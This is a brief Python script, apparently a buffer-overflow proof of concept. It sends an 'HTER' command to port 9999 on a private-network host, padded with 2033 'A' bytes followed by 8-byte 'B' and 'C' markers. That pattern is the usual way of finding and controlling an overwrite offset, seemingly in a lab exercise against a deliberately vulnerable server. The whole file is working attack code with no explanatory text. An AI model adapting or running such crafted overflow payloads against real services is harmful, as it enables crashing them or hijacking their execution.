import socket, sys
from time import sleep
payload=b""
payload+=b"A"*2033
payload+=b"B"*8
payload+=b"C"*8
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
